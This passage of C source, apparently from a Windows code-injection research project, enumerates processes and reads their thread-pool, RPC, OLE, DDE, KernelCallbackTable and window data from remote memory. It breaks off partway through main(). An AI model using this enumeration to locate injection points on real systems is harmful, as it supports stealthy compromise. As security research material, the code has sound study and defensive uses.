    printf("Window handle : %p\n", (void*)hwnd);
    
    for(i=0;i<NUM_XMSGS;i++) {
      wprintf(L"Sending %s...\n", xmsglist[i].text);
      SendMessage(hwnd, xmsglist[i].code, 0x12345678, 0x12345678);
      Sleep(500);
    }
    return 0;
}

```

`tpp/tpplist.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE

#include <windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <psapi.h>
#include <shlwapi.h>
#include <wincrypt.h>
#include <dbghelp.h>

#include "../ntlib/ntddk.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "User32.lib")

#define SCAN_TYPE_TPP 0
#define SCAN_TYPE_OLE 1
#define SCAN_TYPE_RPC 2
#define SCAN_TYPE_WIN 3
#define SCAN_TYPE_DDE 4
#define SCAN_TYPE_SVC 5
#define SCAN_TYPE_WNF 6
#define SCAN_TYPE_KCT 7
#define SCAN_TYPE_SHN 8

// allocate memory
LPVOID xmalloc (SIZE_T dwSize) {
    return HeapAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
}

// re-allocate memory
LPVOID xrealloc (LPVOID lpMem, SIZE_T dwSize) { 
    return HeapReAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, lpMem, dwSize);
}

// free memory
void xfree (LPVOID lpMem) {
    HeapFree (GetProcessHeap(), 0, lpMem);
}

BOOL SetPrivilege(wchar_t szPrivilege[], BOOL bEnable) {
    HANDLE           hToken;
    BOOL             bResult;
    LUID             luid;
    TOKEN_PRIVILEGES tp;
    
    bResult = OpenProcessToken(GetCurrentProcess(), 
      TOKEN_ADJUST_PRIVILEGES, &hToken);
    
    if (bResult) {    
      bResult = LookupPrivilegeValue(NULL, szPrivilege, &luid);
      if (bResult) {
        tp.PrivilegeCount           = 1;
        tp.Privileges[0].Luid       = luid;
        tp.Privileges[0].Attributes = (bEnable) ? SE_PRIVILEGE_ENABLED : 0;

        AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
        bResult = GetLastError() == ERROR_SUCCESS;
      }
      CloseHandle(hToken);
    }
    return bResult;
}

PWCHAR pid2name(DWORD pid) {
    HANDLE         hSnap;
    BOOL           bResult;
    PROCESSENTRY32 pe32;
    PWCHAR         name=L"N/A";
    
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (hSnap != INVALID_HANDLE_VALUE) {
      pe32.dwSize = sizeof(PROCESSENTRY32);
      
      bResult = Process32First(hSnap, &pe32);
      while (bResult) {
        if (pe32.th32ProcessID == pid) {
          name = pe32.szExeFile;
          break;
        }
        bResult = Process32Next(hSnap, &pe32);
      }
      CloseHandle(hSnap);
    }
    return name;
}

DWORD name2pid(LPWSTR ImageName) {
    HANDLE         hSnap;
    PROCESSENTRY32 pe32;
    DWORD          dwPid=0;
    
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return 0;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // get first process
    if(Process32First(hSnap, &pe32)){
      do {
        if (lstrcmpi(ImageName, pe32.szExeFile)==0) {
          dwPid = pe32.th32ProcessID;
          break;
        }
      } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    return dwPid;
}
  
// the allocation is performed by TppAllocThreadData
#define THREAD_POOL_DATA_SIZE 0x88

typedef struct _THREAD_POOL_DATA {
    ULONG_PTR data[THREAD_POOL_DATA_SIZE/sizeof(ULONG_PTR)];
} THREAD_POOL_DATA;

// list thread pools for a process
VOID GetProcessThreadPools(DWORD pid, BOOL symbol) {
    HANDLE                   hSnap, hProcess, hThread;
    THREADENTRY32            te32;
    DWORD                    i;
    THREAD_BASIC_INFORMATION tbi;
    NTSTATUS                 status;
    TEB                      teb;
    SIZE_T                   rd;
    THREAD_POOL_DATA         tpd;
    PBYTE                    addr=NULL;
    BYTE                     buffer[sizeof(SYMBOL_INFO)+MAX_SYM_NAME*sizeof(WCHAR)];
    PSYMBOL_INFO             pSymbol=(PSYMBOL_INFO)buffer;
    WCHAR                    filename[MAX_PATH], perms[32];
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T                   res;
    
    // try open the process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hProcess==NULL) {
      wprintf(L"Unable to open %s:%lu\n", pid2name(pid), GetLastError());
      return;
    }
    // if symbol is TRUE, try initialize 
    if(symbol && !SymInitialize(hProcess, NULL, TRUE)) {
      wprintf(L"Unable to initialze symbols for %s\n", pid2name(pid));
      return;
    }
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pid);
    if(hSnap == INVALID_HANDLE_VALUE) return;
    
    te32.dwSize = sizeof(THREADENTRY32);

    // get the first thread
    if(Thread32First(hSnap, &te32)) {
      do {
        // does it match our process?
        if(te32.th32OwnerProcessID == pid) {
          // open the thread
          hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
          if(hThread != NULL) {
            // query the address of TEB
            status = NtQueryInformationThread(hThread, 
              ThreadBasicInformation, &tbi, sizeof(tbi), NULL);
            if(NT_SUCCESS(status)) {
              // try reading the TEB into local memory
              if(ReadProcessMemory(hProcess, tbi.TebBaseAddress, &teb, sizeof(teb), &rd)) {
                // does thread have a thread pool?
                if(teb.ThreadPoolData != NULL) {
                  wprintf(L"\nProcess        : %s:%lu\n", pid2name(pid), pid);
                  wprintf(L"Thread ID      : %lu (0x%lx)\n", te32.th32ThreadID, te32.th32ThreadID);
                  wprintf(L"TEB            : %p\n", tbi.TebBaseAddress);
                  wprintf(L"ThreadPoolData : %p\n\n", teb.ThreadPoolData);
                  // read thread pool
                  if(ReadProcessMemory(hProcess, teb.ThreadPoolData, &tpd, sizeof(tpd), &rd)) {
                    addr = teb.ThreadPoolData;
                    for(i=0;i<sizeof(tpd)/sizeof(ULONG_PTR);i++) {
                      lstrcpy(perms, L"N/A");
                      // get the permissions of address
                      if(tpd.data[i] != 0) {
                        res=VirtualQueryEx(hProcess, (LPVOID)tpd.data[i], &mbi, sizeof(mbi));
                        if(res == sizeof(mbi)) {
                          if(mbi.Protect & PAGE_READWRITE)         lstrcpy(perms, L"RW");
                          if(mbi.Protect & PAGE_READONLY)          lstrcpy(perms, L"R");
                          if(mbi.Protect & PAGE_EXECUTE_READ)      lstrcpy(perms, L"XR");
                          if(mbi.Protect & PAGE_EXECUTE_READWRITE) lstrcpy(perms, L"XRW");
                        }
                      }
                      ZeroMemory(filename, sizeof(filename));
                      GetMappedFileName(hProcess, (LPVOID)tpd.data[i], filename, MAX_PATH);
                      PathStripPath(filename);
                      
                      wprintf(L"0x%p : %p : %3s : %s ", 
                        addr+i*sizeof(ULONG_PTR),
                        (void*)tpd.data[i], perms, filename);
                        
                      // try dump symbol if a memory query succeeded
                      if(symbol && res == sizeof(mbi)) {
                        pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
                        pSymbol->MaxNameLen   = MAX_SYM_NAME;
                        
                        if(SymFromAddr(hProcess, tpd.data[i], NULL, pSymbol)) {
                          printf(": %s", pSymbol->Name);
                        }
                      }
                      putchar('\n');
                    }
                  }
                }
              }
            }
            CloseHandle(hThread);
          }
        }
      } while(Thread32Next(hSnap, &te32));
    }
    CloseHandle(hSnap);
    if(symbol) SymCleanup(hProcess);
    CloseHandle(hProcess);
}

#define RPC_INFO_DATA_SIZE 0xE8

typedef struct _RPC_INFO_DATA {
    ULONG_PTR data[RPC_INFO_DATA_SIZE/sizeof(ULONG_PTR)];
} RPC_INFO_DATA;

// list rpc data for a process
VOID GetProcessRPCInfo(DWORD pid, BOOL symbol) {
    HANDLE                   hSnap, hProcess, hThread;
    THREADENTRY32            te32;
    DWORD                    i;
    THREAD_BASIC_INFORMATION tbi;
    NTSTATUS                 status;
    TEB                      teb;
    SIZE_T                   rd;
    RPC_INFO_DATA            tpd;
    PBYTE                    addr=NULL;
    BYTE                     buffer[sizeof(SYMBOL_INFO)+MAX_SYM_NAME*sizeof(WCHAR)];
    PSYMBOL_INFO             pSymbol=(PSYMBOL_INFO)buffer;
    WCHAR                    filename[MAX_PATH], perms[32];
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T                   res;
    
    // try open the process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hProcess==NULL) {
      wprintf(L"Unable to open %s:%lu\n", pid2name(pid), GetLastError());
      return;
    }
    // if symbol is TRUE, try initialize 
    if(symbol && !SymInitialize(hProcess, NULL, TRUE)) {
      wprintf(L"Unable to initialze symbols for %s\n", pid2name(pid));
      return;
    }
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pid);
    if(hSnap == INVALID_HANDLE_VALUE) return;
    
    te32.dwSize = sizeof(THREADENTRY32);

    // get the first thread
    if(Thread32First(hSnap, &te32)) {
      do {
        // does it match our process?
        if(te32.th32OwnerProcessID == pid) {
          // open the thread
          hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
          if(hThread != NULL) {
            // query the address of TEB
            status = NtQueryInformationThread(hThread, 
              ThreadBasicInformation, &tbi, sizeof(tbi), NULL);
            if(NT_SUCCESS(status)) {
              // try reading the TEB into local memory
              if(ReadProcessMemory(hProcess, tbi.TebBaseAddress, &teb, sizeof(teb), &rd)) {
                // does thread have an rpc server?
                if(teb.ReservedForNtRpc != NULL) {
                  (ULONG64)teb.ReservedForNtRpc ^= 0xABABABABDEDEDEDE;
                  
                  wprintf(L"\nProcess          : %s:%lu\n", pid2name(pid), pid);
                  wprintf(L"Thread ID        : %lu (0x%lx)\n", te32.th32ThreadID, te32.th32ThreadID);
                  wprintf(L"TEB              : %p\n", tbi.TebBaseAddress);
                  wprintf(L"ReservedForNtRpc : %p\n\n", teb.ReservedForNtRpc);
                  // read thread pool
                  if(ReadProcessMemory(hProcess, teb.ReservedForNtRpc, &tpd, sizeof(tpd), &rd)) {
                    addr = teb.ReservedForNtRpc;
                    for(i=0;i<sizeof(tpd)/sizeof(ULONG_PTR);i++) {
                      lstrcpy(perms, L"N/A");
                      // get the permissions of address
                      if(tpd.data[i] != 0) {
                        res=VirtualQueryEx(hProcess, (LPVOID)tpd.data[i], &mbi, sizeof(mbi));
                        if(res == sizeof(mbi)) {
                          if(mbi.Protect & PAGE_READWRITE)         lstrcpy(perms, L"RW");
                          if(mbi.Protect & PAGE_READONLY)          lstrcpy(perms, L"R");
                          if(mbi.Protect & PAGE_EXECUTE_READ)      lstrcpy(perms, L"XR");
                          if(mbi.Protect & PAGE_EXECUTE_READWRITE) lstrcpy(perms, L"XRW");
                        }
                      }
                      ZeroMemory(filename, sizeof(filename));
                      GetMappedFileName(hProcess, (LPVOID)tpd.data[i], filename, MAX_PATH);
                      PathStripPath(filename);
                      
                      wprintf(L"0x%p : %p : %3s : %s ", 
                        addr+i*sizeof(ULONG_PTR),
                        (void*)tpd.data[i], perms, filename);
                        
                      // try dump symbol if a memory query succeeded
                      if(symbol && res == sizeof(mbi)) {
                        pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
                        pSymbol->MaxNameLen   = MAX_SYM_NAME;
                        
                        if(SymFromAddr(hProcess, tpd.data[i], NULL, pSymbol)) {
                          printf(": %s", pSymbol->Name);
                        }
                      }
                      putchar('\n');
                    }
                  }
                }
              }
            }
            CloseHandle(hThread);
          }
        }
      } while(Thread32Next(hSnap, &te32));
    }
    CloseHandle(hSnap);
    if(symbol) SymCleanup(hProcess);
    CloseHandle(hProcess);
}

#include "oletls.h"

// list ole data for a process
VOID GetProcessOLEInfo(DWORD pid, BOOL symbol) {
    HANDLE                   hSnap, hProcess, hThread;
    THREADENTRY32            te32;
    DWORD                    i;
    THREAD_BASIC_INFORMATION tbi;
    NTSTATUS                 status;
    TEB                      teb;
    SIZE_T                   rd;
    PBYTE                    addr=NULL;
    BYTE                     buffer[sizeof(SYMBOL_INFO)+MAX_SYM_NAME*sizeof(WCHAR)];
    PSYMBOL_INFO             pSymbol=(PSYMBOL_INFO)buffer;
    WCHAR                    filename[MAX_PATH], perms[32];
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T                   res;
    SOleTlsData2             oleinfo;
    WCHAR                    cls[MAX_PATH];
    
    // try open the process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hProcess==NULL) {
      wprintf(L"Unable to open %s:%lu\n", pid2name(pid), GetLastError());
      return;
    }
    // if symbol is TRUE, try initialize 
    if(symbol && !SymInitialize(hProcess, NULL, TRUE)) {
      wprintf(L"Unable to initialze symbols for %s\n", pid2name(pid));
      return;
    }
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pid);
    if(hSnap == INVALID_HANDLE_VALUE) return;
    
    te32.dwSize = sizeof(THREADENTRY32);

    // get the first thread
    if(Thread32First(hSnap, &te32)) {
      do {
        // does it match our process?
        if(te32.th32OwnerProcessID == pid) {
          // open the thread
          hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
          if(hThread != NULL) {
            // query the address of TEB
            status = NtQueryInformationThread(hThread, 
              ThreadBasicInformation, &tbi, sizeof(tbi), NULL);
            if(NT_SUCCESS(status)) {
              // try reading the TEB into local memory
              if(ReadProcessMemory(hProcess, tbi.TebBaseAddress, &teb, sizeof(teb), &rd)) {
                // does thread have an ole data?
                if(teb.ReservedForOle != NULL) {
                  
                  if(ReadProcessMemory(hProcess, teb.ReservedForOle, &oleinfo, sizeof(oleinfo), &rd)) {
                    addr = teb.ReservedForOle;
                    
                    if(oleinfo.pDataObjClip != NULL) {
                      wprintf(L"\n"
                              L"Process          : %s:%lu\n", pid2name(pid), pid);
                      wprintf(L"Thread ID        : %lu (0x%lx)\n", te32.th32ThreadID, te32.th32ThreadID);
                      wprintf(L"TEB              : %p\n", tbi.TebBaseAddress);
                      wprintf(L"ReservedForOle   : %p\n", teb.ReservedForOle);
                      cls[0] = 0;
                      GetClassName(oleinfo.hwndClip, cls, ARRAYSIZE(cls));
                      
                      printf("HWND             : %p (%ws)\n", oleinfo.hwndClip, cls);
                      printf("IDataObject      : %p\n",       oleinfo.pDataObjClip);
                      
                      printf("ClipboardDataObjectInterface     : %p\n", 
                        GetProp(oleinfo.hwndClip, L"ClipboardDataObjectInterface"));
                      
                      printf("ClipboardRootDataObjectInterface : %p\n", 
                        GetProp(oleinfo.hwndClip, L"ClipboardRootDataObjectInterface"));
                      
                      printf("ClipboardDataObjectInterfaceMTA  : %p\n", 
                        GetProp(oleinfo.hwndClip, L"ClipboardDataObjectInterfaceMTA" ));
                      
                      printf("OLEClipPackgeOwner               : %p\n", 
                        GetProp(oleinfo.hwndClip, L"OLEClipPackgeOwner"));
                        
                      printf("OleClipProcessOwner              : %p\n", 
                        GetProp(oleinfo.hwndClip, L"OleClipProcessOwner"));
                    }
                    /**
                    for(i=0;i<sizeof(tpd)/sizeof(ULONG_PTR);i++) {
                      lstrcpy(perms, L"N/A");
                      // get the permissions of address
                      if(tpd.data[i] != 0) {
                        res=VirtualQueryEx(hProcess, (LPVOID)tpd.data[i], &mbi, sizeof(mbi));
                        if(res == sizeof(mbi)) {
                          if(mbi.Protect & PAGE_READWRITE)         lstrcpy(perms, L"RW");
                          if(mbi.Protect & PAGE_READONLY)          lstrcpy(perms, L"R");
                          if(mbi.Protect & PAGE_EXECUTE_READ)      lstrcpy(perms, L"XR");
                          if(mbi.Protect & PAGE_EXECUTE_READWRITE) lstrcpy(perms, L"XRW");
                        }
                      }
                      ZeroMemory(filename, sizeof(filename));
                      GetMappedFileName(hProcess, (LPVOID)tpd.data[i], filename, MAX_PATH);
                      PathStripPath(filename);
                      
                      wprintf(L"0x%p : %p : %3s : %s ", 
                        addr+i*sizeof(ULONG_PTR),
                        (void*)tpd.data[i], perms, filename);
                        
                      // try dump symbol if a memory query succeeded
                      if(symbol && res == sizeof(mbi)) {
                        pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
                        pSymbol->MaxNameLen   = MAX_SYM_NAME;
                        
                        if(SymFromAddr(hProcess, tpd.data[i], NULL, pSymbol)) {
                          printf(": %s", pSymbol->Name);
                        }
                      }
                      putchar('\n');
                    }*/
                  }
                }
              }
            }
            CloseHandle(hThread);
          }
        }
      } while(Thread32Next(hSnap, &te32));
    }
    CloseHandle(hSnap);
    if(symbol) SymCleanup(hProcess);
    CloseHandle(hProcess);
}

// list ole data for a process
VOID GetProcessKCT(DWORD pid, BOOL symbol) {
    HANDLE                    hProcess;
    DWORD                     i;
    PROCESS_BASIC_INFORMATION pbi;
    NTSTATUS                  status;
    PEB                       peb;
    SIZE_T                    rd;
    PBYTE                     addr=NULL;
    BYTE                      buffer[sizeof(SYMBOL_INFO)+MAX_SYM_NAME*sizeof(WCHAR)];
    PSYMBOL_INFO              pSymbol=(PSYMBOL_INFO)buffer;
    
    // try open the process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hProcess==NULL) {
      wprintf(L"Unable to open %s:%lu\n", pid2name(pid), GetLastError());
      return;
    }
    // if symbol is TRUE, try initialize 
    if(symbol && !SymInitialize(hProcess, NULL, TRUE)) {
      wprintf(L"Unable to initialze symbols for %s\n", pid2name(pid));
      return;
    }

    status = NtQueryInformationProcess(hProcess, 
      ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
      
    if(NT_SUCCESS(status)) {
      // try reading the PEB into local memory
      if(ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &rd)) {
        // does thread have an ole data?
        if(peb.KernelCallbackTable != NULL) {
          wprintf(L"\n");
          wprintf(L"Process               : %s\n", pid2name(pid));
          wprintf(L"PEB                   : %p\n", pbi.PebBaseAddress);
          wprintf(L"KernelCallbackTable   : %p\n", peb.KernelCallbackTable);
          
          /**for(i=0; ; i++) {
            pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
            pSymbol->MaxNameLen   = MAX_SYM_NAME;
                        
            if(SymFromAddr(hProcess, tpd.data[i], NULL, pSymbol)) {
              if(pSymbol->Name[0] != L'_') break;
              printf(": %s", pSymbol->Name);
            }
          }*/
        }
      }
    }
    if(symbol) SymCleanup(hProcess);
    CloseHandle(hProcess);
}

// list ole data for a process
VOID GetProcessDDE(DWORD pid, BOOL symbol) {
    HANDLE                   hSnap, hProcess, hThread;
    THREADENTRY32            te32;
    DWORD                    i;
    THREAD_BASIC_INFORMATION tbi;
    NTSTATUS                 status;
    TEB                      teb;
    SIZE_T                   rd;
    PBYTE                    addr=NULL;
    BYTE                     buffer[sizeof(SYMBOL_INFO)+MAX_SYM_NAME*sizeof(WCHAR)];
    PSYMBOL_INFO             pSymbol=(PSYMBOL_INFO)buffer;
    WCHAR                    filename[MAX_PATH], perms[32];
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T                   res;
    SOleTlsData2             oleinfo;
    WCHAR                    cls[MAX_PATH];
    
    // try open the process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hProcess==NULL) {
      wprintf(L"Unable to open %s:%lu\n", pid2name(pid), GetLastError());
      return;
    }
    // if symbol is TRUE, try initialize 
    if(symbol && !SymInitialize(hProcess, NULL, TRUE)) {
      wprintf(L"Unable to initialze symbols for %s\n", pid2name(pid));
      return;
    }
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pid);
    if(hSnap == INVALID_HANDLE_VALUE) return;
    
    te32.dwSize = sizeof(THREADENTRY32);

    // get the first thread
    if(Thread32First(hSnap, &te32)) {
      do {
        // does it match our process?
        if(te32.th32OwnerProcessID == pid) {
          // open the thread
          hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
          if(hThread != NULL) {
            // query the address of TEB
            status = NtQueryInformationThread(hThread, 
              ThreadBasicInformation, &tbi, sizeof(tbi), NULL);
            if(NT_SUCCESS(status)) {
              // try reading the TEB into local memory
              if(ReadProcessMemory(hProcess, tbi.TebBaseAddress, &teb, sizeof(teb), &rd)) {
                // does thread have an ole data?
                if(teb.ReservedForOle != NULL) {
                  
                  if(ReadProcessMemory(hProcess, teb.ReservedForOle, &oleinfo, sizeof(oleinfo), &rd)) {
                    addr = teb.ReservedForOle;
                    
                    if(oleinfo.hwndDdeServer != NULL ||
                       oleinfo.hwndDdeClient != NULL) {
                      wprintf(L"\n"
                              L"Process          : %s:%lu\n", pid2name(pid), pid);
                      wprintf(L"Thread ID        : %lu (0x%lx)\n", te32.th32ThreadID, te32.th32ThreadID);
                      wprintf(L"TEB              : %p\n", tbi.TebBaseAddress);
                      wprintf(L"ReservedForOle   : %p\n", teb.ReservedForOle);
                      
                      cls[0] = 0;
                      GetClassName(oleinfo.hwndDdeClient, cls, ARRAYSIZE(cls));
                      printf("Client HWND             : %p (%ws)\n", oleinfo.hwndDdeClient, cls);
                      
                      cls[0] = 0;
                      GetClassName(oleinfo.hwndDdeClient, cls, ARRAYSIZE(cls));
                      printf("Server HWND             : %p (%ws)\n", oleinfo.hwndDdeServer, cls);
                    }
    
                  }
                }
              }
            }
            CloseHandle(hThread);
          }
        }
      } while(Thread32Next(hSnap, &te32));
    }
    CloseHandle(hSnap);
    if(symbol) SymCleanup(hProcess);
    CloseHandle(hProcess);
}

// list ole data for a process
VOID GetProcessSHN(DWORD pid, BOOL symbol) {
    HANDLE                   hSnap, hProcess, hThread;
    THREADENTRY32            te32;
    DWORD                    i;
    THREAD_BASIC_INFORMATION tbi;
    NTSTATUS                 status;
    TEB                      teb;
    SIZE_T                   rd;
    PBYTE                    addr=NULL;
    BYTE                     buffer[sizeof(SYMBOL_INFO)+MAX_SYM_NAME*sizeof(WCHAR)];
    PSYMBOL_INFO             pSymbol=(PSYMBOL_INFO)buffer;
    WCHAR                    filename[MAX_PATH], perms[32];
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T                   res;
    SOleTlsData2             oleinfo;
    WCHAR                    cls[MAX_PATH];
    ULONG_PTR                ptr;
    
    // try open the process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hProcess==NULL) {
      wprintf(L"Unable to open %s:%lu\n", pid2name(pid), GetLastError());
      return;
    }
    // if symbol is TRUE, try initialize 
    if(symbol && !SymInitialize(hProcess, NULL, TRUE)) {
      wprintf(L"Unable to initialze symbols for %s\n", pid2name(pid));
      return;
    }
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pid);
    if(hSnap == INVALID_HANDLE_VALUE) return;
    
    te32.dwSize = sizeof(THREADENTRY32);

    // get the first thread
    if(Thread32First(hSnap, &te32)) {
      do {
        // does it match our process?
        if(te32.th32OwnerProcessID == pid) {
          // open the thread
          hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
          if(hThread != NULL) {
            // query the address of TEB
            status = NtQueryInformationThread(hThread, 
              ThreadBasicInformation, &tbi, sizeof(tbi), NULL);
            if(NT_SUCCESS(status)) {
              // try reading the TEB into local memory
              if(ReadProcessMemory(hProcess, tbi.TebBaseAddress, &teb, sizeof(teb), &rd)) {
                //printf("offset is %zx\n", offsetof(TEB, Win32ClientInfo[4]));
                if(ReadProcessMemory(hProcess, 
                  (PBYTE)tbi.TebBaseAddress + offsetof(TEB, Win32ClientInfo[4]), 
                  &ptr, sizeof(ULONG_PTR), &rd)) 
                {
                  if(ptr != 0) {
                    printf("TEB : %p Win32ClientInfo[4] : %p\n", 
                      tbi.TebBaseAddress, ptr);
                      
                    if(ReadProcessMemory(hProcess,
                      (PBYTE)ptr + 56, &ptr, sizeof(ULONG_PTR), &rd)) 
                    {
                      if(ptr != 0) {
                        printf("Shell Window : %p\n\n", ptr);
                      }
                    }
                  }
                }
              }
            }
            CloseHandle(hThread);
          }
        }
      } while(Thread32Next(hSnap, &te32));
    }
    CloseHandle(hSnap);
    if(symbol) SymCleanup(hProcess);
    CloseHandle(hProcess);
}

// list windows for process
BOOL CALLBACK EnumThreadWndProc(HWND hwnd, LPARAM lParam) {
    WCHAR                    cls[MAX_PATH]; 
    THREADENTRY32            *te32 = (THREADENTRY32*)lParam;
    
    GetClassName(hwnd, cls, MAX_PATH);
    
    printf("%-20ws:%i : %p : %ws\n", 
      pid2name(te32->th32OwnerProcessID), 
      te32->th32OwnerProcessID,
      (LPVOID)hwnd, 
      cls);
    
    return TRUE;
}

VOID GetProcessWindows(DWORD pid, BOOL symbol) {
    HANDLE                   hSnap, hProcess, hThread;
    THREADENTRY32            te32;
    
    // try open the process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hProcess==NULL) {
      wprintf(L"Unable to open %s:%lu\n", pid2name(pid), GetLastError());
      return;
    }
    // if symbol is TRUE, try initialize 
    if(symbol && !SymInitialize(hProcess, NULL, TRUE)) {
      wprintf(L"Unable to initialze symbols for %s\n", pid2name(pid));
      return;
    }
    // create snapshot of system
    // 9D0BA50
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pid);
    if(hSnap == INVALID_HANDLE_VALUE) return;
    
    te32.dwSize = sizeof(THREADENTRY32);

    // get the first thread
    if(Thread32First(hSnap, &te32)) {
      do {
        // does it match our process?
        if(te32.th32OwnerProcessID == pid) {
          EnumThreadWindows(te32.th32ThreadID, EnumThreadWndProc, (LPARAM)&te32);
        }
      } while(Thread32Next(hSnap, &te32));
    }
    CloseHandle(hSnap);
    if(symbol) SymCleanup(hProcess);
    CloseHandle(hProcess);
}

// list thread pools for each process on a system
VOID ScanSystem(DWORD pid, BOOL symbol, int type) {
    HANDLE         hSnap;
    PROCESSENTRY32 pe32;

    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // get first process
    if(Process32First(hSnap, &pe32)){
      do {
        if(pid!=0 && pe32.th32ProcessID != pid) continue;
        if(pe32.th32ProcessID == GetCurrentProcessId()) continue;
        
        if(type == SCAN_TYPE_TPP) {
          GetProcessThreadPools(pe32.th32ProcessID, symbol);
        } else if (type == SCAN_TYPE_RPC) {
          GetProcessRPCInfo(pe32.th32ProcessID, symbol);
        } else if (type == SCAN_TYPE_OLE) {
          GetProcessOLEInfo(pe32.th32ProcessID, symbol);
        } else if (type == SCAN_TYPE_WIN) {
          GetProcessWindows(pe32.th32ProcessID, symbol);
        } else if (type == SCAN_TYPE_DDE) {
          GetProcessDDE(pe32.th32ProcessID, symbol);
        } else if (type == SCAN_TYPE_KCT) {
          GetProcessKCT(pe32.th32ProcessID, symbol);
        } else if (type == SCAN_TYPE_SHN) {
          GetProcessSHN(pe32.th32ProcessID, symbol);
        }
      } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
}

int main(void) {
    DWORD   pid=0;
    PWCHAR  *argv, process=NULL;
    int     argc, i, type = SCAN_TYPE_TPP;
    BOOL    symbol=TRUE;  // should probably add an option to disable this
    
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    
    for(i=1;i<argc;i++) {
      if(argv[i][0] == L'/' || argv[i][0] == L'-') {
        if(!lstrcmpi(L"ole", &argv[i][1])) { type = SCAN_TYPE_OLE; continue; }
        if(!lstrcmpi(L"rpc", &argv[i][1])) { type = SCAN_TYPE_RPC; continue; }
        if(!lstrcmpi(L"tpp", &argv[i][1])) { type = SCAN_TYPE_TPP; continue; }
        if(!lstrcmpi(L"win", &argv[i][1])) { type = SCAN_TYPE_WIN; continue; }
        if(!lstrcmpi(L"dde", &argv[i][1])) { type = SCAN_TYPE_DDE; continue; }
        if(!lstrcmpi(L"kct", &argv[i][1])) { type = SCAN_TYPE_KCT; continue; }
        if(!lstrcmpi(L"shn", &argv[i][1])) { type = SCAN_TYPE_SHN; continue; }
        printf("unknown option : %ws\n", argv[i]);
        return -1;
      }
      process = argv[i];
    }
    // if the user provides parameter
    // assume it's a process name or id
    if(process!=NULL) {
      pid=name2pid(process);
      if(pid==0) pid=wcstoull(process, NULL, 10);
